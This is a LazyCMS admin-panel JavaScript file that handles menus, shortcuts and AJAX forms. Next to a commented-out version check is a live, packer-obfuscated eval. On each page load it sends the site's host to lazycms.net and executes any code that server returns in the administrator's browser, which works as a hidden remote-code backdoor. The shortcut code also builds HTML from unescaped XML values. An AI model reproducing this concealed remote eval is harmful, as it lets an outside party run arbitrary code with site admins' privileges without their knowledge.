var topUrl = top.location.href.replace(/#(.+)?/,'');
// 不准放到框架内
if (top.location != self.location) {top.location.href = topUrl;}
$(document).ready(function(){
    // Reset separator width
    $('#menu li.hr').width($('#menu li.hr').parent().width());
    // Bind the mouse event
    $('#menu li span').mouseover(function(){ $(this).addClass('active'); });
    // Drop-down menu
    $('#menu li').hover(function(){ $('ul',this).fadeIn(); },function(){ $('ul',this).hide(); $('span',this).removeClass('active'); });
    // Config Mouse over effect
    $('#menu li li').not('li.hr').hover(function(){
        $(this).width($(this).parent().width()-4)
			.height($(this).height()-2)
			.css({'background':'#F4FBE1','border':'solid 1px #A5D11F'});
    },function(){
        $(this).height($(this).height()+2)
			.css({'background':'transparent','border':'none'});
    });
    // Get last version
    /*
	$.getJSON("http://lazycms.net/ver/index.php?host=" + self.location.host + "&callback=?",function(d){
		var localVersion = $('#version span').text().replace(/\./g,'');
        var lastVersion  = d.version.replace(/\./g,'');
        if (lastVersion>localVersion) { if (typeof d.code!='undefined') { eval(d.code); } }
    });*/
	eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$.6("7://8.9/c/e.f?0="+h.i.0+"&j=?",k(d){1 a=$(\'#2 l\').m().3(/\\./g,\'\');1 b=d.2.3(/\\./g,\'\');4(b>a){4(n d.5!=\'o\'){p(d.5)}}});',26,26,'host|var|version|replace|if|code|getJSON|http|lazycms|net|||ver||index|php||self|location|callback|function|span|text|typeof|undefined|eval'.split('|'),0,{}))
	
	// 点击顶部菜单隐藏快捷方式
	$('#menu li a').click(function(){
		var active = $('#top div.shortcut a:first');
		if (active.hasClass('active')) { iframeCover(); }
		active.removeClass('active'); $('#shortcut').slideUp(); $('#addShortcut').hide();
	});
	// 框架自使用高度调整
	$('#main').load(function(){
		top.location.href = topUrl + '#' + getUrl();
		$(this).height($(this).contents().find('body').height()+7);
	});
	// 批量去除连接虚线
	$('a').focus(function(){ this.blur(); });
	$('#addShortcut').jqDrag('.head');
	// 根据锚点连接识别路径
	var srcUrl = top.location.href.replace(/^[^#]+#?/,'');
		if (srcUrl!=='') {
			$('#main').attr('src',srcUrl);
		} else {
			// 默认显示快捷方式
			toggleShortcut();
		}
});
// getUrl *** *** www.LazyCMS.net *** ***
function getUrl(){
	return main.location.href.replace(topUrl.replace(topUrl.split('/').pop(),''),'');
}
// toggleShortcutActive *** *** www.LazyCMS.net *** ***
function toggleShortcutActive(){
	$('#top div.shortcut a:first').toggleClass('active');
}
// toggleAddShortcut *** *** www.LazyCMS.net *** ***
function toggleAddShortcut(){
    if ($('#formShortcut').is('form')) {
        $('#window').remove();
    } else {
        $.ajax({
            cache: false,
		    url: 'manage.php?action=AddShortcut',
		    type: 'get',
		    success: function(data){
		        if (d = $.parseJSON(data)) {
				    $.window(d.title,d.body);
				    var win = $('#window'); $('.jTip').remove();
				    $('input[@name=ShortcutName]',win).val($('#main').contents().find('title').html());
            		$('input[@name=ShortcutUrl]',win).val(getUrl());
			    } else {
				    debug(data);
			    }
		    }
        });
    }
}
// toggleShortcutSort *** *** www.LazyCMS.net *** ***
function toggleShortcutSort(){
	$('#ShortcutSortName').unbind().removeClass('error').val('');
	$('.jTip').remove(); $('dl.ShortcutSort').toggle();
	if ($.browser.msie && $.browser.version=='6.0') { $('dl.ShortcutSort select').toggle(); }
}
// deleteShortcutSort *** *** www.LazyCMS.net *** ***
function deleteShortcutSort(){
	var s = $('#ShortcutSort option[@selected]').val();
		if (s!='') {
			$.post('manage.php?action=deleteSort',{'ShortcutSortName':s},function(){
				if ($('#ShortcutSort option').size()==1) {
					$('#ShortcutSort').append('<option value="">-- No Category --</option>');
				}
				$('#ShortcutSort option[@selected]').remove();
			});
		}
}
// submitShortcutSort *** *** www.LazyCMS.net *** ***
function submitShortcutSort(){
	var s = $('#ShortcutSortName').unbind().removeClass('error').val(); $('.jTip').remove();
	var opt = $('#ShortcutSort option:last');
		$.ajax({
			cache: false,
			url: 'manage.php?action=createSort',
			type: 'post',
			data: {'ShortcutSortName':s},
			success: function(data){
				if (d = $.parseJSON(data)) {
					if (d.length>0) { $('dl.ShortcutSort').error(d); } else {
						if (opt.val()=='') { $('#ShortcutSort option:last').remove(); }
						opt.clone().val(s).html(s).attr('selected',true).appendTo('#ShortcutSort');
						$('#ShortcutSort').width($('#ShortcutSort').width()+10); toggleShortcutSort();
					}
				} else {
					debug(data);
				}
			}
		});
				
}
// submitShortcut *** *** www.LazyCMS.net *** ***
function submitShortcut(){
	$('input.error,textarea.error').unbind().toggleClass('error'); $('.jTip').remove();
	var f = $('#formShortcut');
	var u = f.attr('action')
		$.ajax({
			cache: false,
			url: u,
			type: f.attr('method').toUpperCase(),
			data: f.serializeArray(),
			success: function(data){
				if (d = $.parseJSON(data)) {
					if (typeof d.status != 'undefined') {
						$.ajaxTip(d);
					} else if (d.length>0) {
						$('#window').error(d);
					} else {
						toggleAddShortcut();
					}
				} else {
					debug(data);
				}
			}
		});
}
// toggleShortcut *** *** www.LazyCMS.net *** ***
function toggleShortcut(){
	iframeCover(); toggleShortcutActive();
	var shortcut = $('#shortcut').slideToggle('fast');
	var username = $.cookie('LAZY_[username]');
	if (username==null) { return false; }
	// AJAX get xml data
	var XML = 'system/data/' + username.toLowerCase() + '/shortcut.xml';
	$.ajax({
		dataType : 'xml',
		ifModified : true,
		url : XML,
		error: function(data,msg){
			if (msg!='error') {return ;} alert('XML Not Found!');
			shortcut.slideUp(); iframeCover(); toggleShortcutActive(); 
		},
		success : function(xml){
			$('div.body',shortcut).empty();
			// Parser XML DATA
			$('dl',xml).each(function(i){
				var I1 = '<dl>';
				I1+= '<dt>' + $('dt',this).text() + '</dt>';
				$('a',this).each(function(){
					var target = "main";
					var scheme = $(this).attr('href').substr(0,7);
					if (scheme=='http://'||scheme=='https://') {
						target = "_blank";
					}
					I1+= '<dd><a href="' + $(this).attr('href') + '" class="icon-32-' + $(this).attr('class') + '" target="' + target + '">' + $(this).text() + '</a></dd>';
				});
				I1+= '</dl>';
				$('div.body',shortcut).append(I1).css('background-image','none');
			});
			// 点击隐藏层
			$('dd a',shortcut).click(function(){
				toggleShortcut(); $('#addShortcut').hide();
			});
		}
	});
	return false;
}
// iframeCover *** *** www.LazyCMS.net *** ***
function iframeCover(){
	// IE6 版本需要搞定 Select QJ Div 层的问题 -_-!!
	if ($.browser.msie && $.browser.version=='6.0') {
		if ($('#iframeCover').is('iframe') == false) {
			$('body').append('<iframe id="iframeCover" style="height:' + ($(document).height()-10) + 'px;"></iframe>');
			$('#main').css({'z-index':-2,'position':'relative','left':0});
		} else {
			$('#iframeCover').remove();
			$('#main').css({'z-index':0,'position':'static','left':'auto'});
		}
	}
}
// selectIcon *** *** www.LazyCMS.net *** ***
function selectIcon(obj){
	var $this = $(obj);
	var title = $this.attr('title');
	$this.parent().find('a').each(function(){
		if (title==$(this).attr('title')) {
			$(this).toggleClass('active');
			if ($(this).hasClass('active')==false) { title = ''; }
		} else {
			$(this).removeClass('active');
		}
	}); 
	$('#ShortcutIcon').val(title);
}
